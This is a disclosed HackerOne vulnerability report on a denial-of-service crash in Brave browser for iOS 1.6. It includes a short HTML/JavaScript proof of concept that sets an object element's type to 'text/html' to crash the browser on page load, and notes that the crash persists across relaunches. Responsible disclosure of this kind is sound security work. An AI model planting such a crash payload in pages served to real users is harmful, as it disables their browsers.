---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '357665'
original_report_id: '357665'
title: DoS in Brave browser for iOS
weakness: Uncontrolled Resource Consumption
team_handle: brave
created_at: '2018-05-26T00:32:25.545Z'
disclosed_at: '2018-09-24T23:36:19.672Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
asset_identifier: https://github.com/brave/browser-ios
asset_type: SOURCE_CODE
max_severity: none
tags:
- hackerone
- uncontrolled-resource-consumption
---

# DoS in Brave browser for iOS

## Metadata

- HackerOne Report ID: 357665
- Weakness: Uncontrolled Resource Consumption
- Program: brave
- Disclosed At: 2018-09-24T23:36:19.672Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

Attacker could initiate DoS during page loading.

## Products affected: 

1.6 (18.05.17.13)
Device iPhone 6s (iOS 11.3.1)

## Steps To Reproduce:

PoC:
```html
<body>
    <script>
        let o = document.body.appendChild(document.createElement('object'));
        // application/json or application/pdf are valid values too
        o.type = 'text/html' // <-- triggers DoS
    </script>
</body>
```

The problem is the way Brave handles `<object>` tag with specific `type` attribute's values. 
Looks like unsupported mimeTypes or non-string values don't trigger crash, so I assume, that only valid mimeTypes could be used. Image mimeTypes don't trigger DoS.

## Supporting Material/References:

As I understood, Brave browser for iOS is a fork of Mozilla Firefox for iOS. 
Firefox isn't vulnerable, what makes this bug eligible. 

Crash log attached.
Screencast attached.

## Impact

The first page loaded after the browser crash is the crashed page. The PoC is immediate and doesn't require any additional interaction, so it could make browser broken, until the tab will be closed in offline.

> I suggest remembering the crashed page and ignoring it during browser opening. Probably, it could make all DoS attacks less dangerous.

> I'm not sure that the trick with tab closing in offline is obvious for most users.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
